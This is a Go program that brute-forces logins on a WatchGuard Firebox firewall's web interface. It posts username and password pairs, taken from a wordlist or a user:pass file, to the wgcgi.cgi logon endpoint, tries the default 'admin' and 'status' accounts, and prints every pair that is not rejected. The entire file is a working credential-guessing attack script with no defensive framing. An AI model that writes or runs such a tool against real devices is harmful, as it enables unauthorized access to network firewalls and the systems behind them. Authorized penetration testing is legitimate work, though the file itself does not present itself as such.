package main

import (
	"bufio"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
)

func listFromFile(filename string) ([]string, error) {
	var result []string
	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("could not open file: %s", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		result = append(result, strings.TrimSpace(scanner.Text()))
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading file: %s", err)
	}

	return result, nil
}

func checkUserPass(url, user, pwd, domain string) {
	site := fmt.Sprintf("%s/wgcgi.cgi?action=fw_logon&style=fw_logon.xsl&fw_logon_type=status", url)

	values := fmt.Sprintf("submit=Login&action=fw_logon&style=fw_logon_progress.xsl&fw_logon_type=logon&fw_username=%s&fw_password=%s&fw_domain=%s", user, pwd, domain)

	resp, err := http.Post(site, "application/x-www-form-urlencoded", strings.NewReader(values))
	if err != nil {
		fmt.Printf("Error during request: %s\n", err)
		return
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	if matched, _ := regexp.MatchString("Authentication Failed:", string(body)); matched {
		fmt.Printf("Failed: %s, %s\n", user, pwd)
	} else {
		fmt.Printf("Success: %s, %s\n", user, pwd)
		fmt.Println(string(body))
	}
}

func main() {
	var server, domain string
	var passfile, userpassfile string
	var httpFlag bool

	flag.StringVar(&server, "server", "192.168.0.1", "IP address of the server (Default: 192.168.0.1)")
	flag.StringVar(&passfile, "p", "", "List of passwords. Will use default usernames of admin and status.")
	flag.StringVar(&userpassfile, "f", "", "List of user:pass combinations.")
	flag.StringVar(&domain, "d", "Firebox-DB", "Login domain (Default: Firebox-DB)")
	flag.BoolVar(&httpFlag, "http", false, "Use an HTTP connection instead of HTTPS")
	flag.Parse()

	var url string
	if httpFlag {
		url = "http://" + server
	} else {
		url = "https://" + server
	}

	if userpassfile != "" {
		credentials, err := listFromFile(userpassfile)
		if err != nil {
			fmt.Println(err)
			return
		}

		for _, c := range credentials {
			parts := strings.SplitN(c, ":", 2)
			if len(parts) != 2 {
				fmt.Printf("Invalid user:pass format in line: %s\n", c)
				continue
			}
			checkUserPass(url, parts[0], parts[1], domain)
		}
	} else {
		users := []string{"admin", "status"}
		pwds, err := listFromFile(passfile)
		if err != nil {
			fmt.Println(err)
			return
		}

		for _, u := range users {
			for _, p := range pwds {
				checkUserPass(url, u, p, domain)
			}
		}
	}
}

